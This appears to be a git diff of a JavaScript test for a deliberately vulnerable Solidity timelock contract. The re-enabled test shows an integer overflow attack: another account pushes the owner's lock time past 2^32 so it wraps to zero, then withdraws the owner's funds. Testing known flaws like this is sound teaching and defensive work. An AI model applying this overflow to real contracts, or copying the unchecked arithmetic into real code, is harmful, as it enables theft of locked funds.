@@ -62,19 +62,24 @@ describe("VulnToOverflow", () => {
     expect(await VulnToOverflowContract.balances(owner.address)).to.equal(0);
   });
 
-  // it("allows overflow attack", async function () {
-  //   const lockTime = await VulnToOverflowContract.lockTime(owner.address);
+  it("allows overflow attack", async function () {
+    const lockTime = await VulnToOverflowContract.lockTime(owner.address);
 
-  //   const timeToOverflow = BigInt(2 ** 256 - Number(lockTime));
+    const timeToOverflow = 2 ** 32 - Number(lockTime);
 
-  //   // TODO: Unexpected error preventing this test
-  //   // Error: value out-of-bounds (argument="_secondsToIncrease", value="115792089237316195423570985008687907853269984665640564039457584007913129639936", code=INVALID_ARGUMENT, version=abi/5.7.0)
-  //   await VulnToOverflowContract.connect(addr1).increaseLockTime(
-  //     timeToOverflow
-  //   );
+    await VulnToOverflowContract.connect(addr1).increaseLockTime(
+      owner.address,
+      timeToOverflow
+    );
 
-  //   await expect(
-  //     VulnToOverflowContract.connect(addr1).withdraw(owner.address)
-  //   ).to.be.revertedWith("TIMELOCK_ACTIVE");
-  // });
+    const nextLockTime = await VulnToOverflowContract.lockTime(owner.address);
+
+    expect(nextLockTime).to.equal(0);
+
+    await expect(
+      VulnToOverflowContract.connect(addr1).withdraw(owner.address)
+    ).not.to.be.revertedWith("TIMELOCK_ACTIVE");
+
+    expect(await VulnToOverflowContract.balances(owner.address)).to.equal(0);
+  });
 });
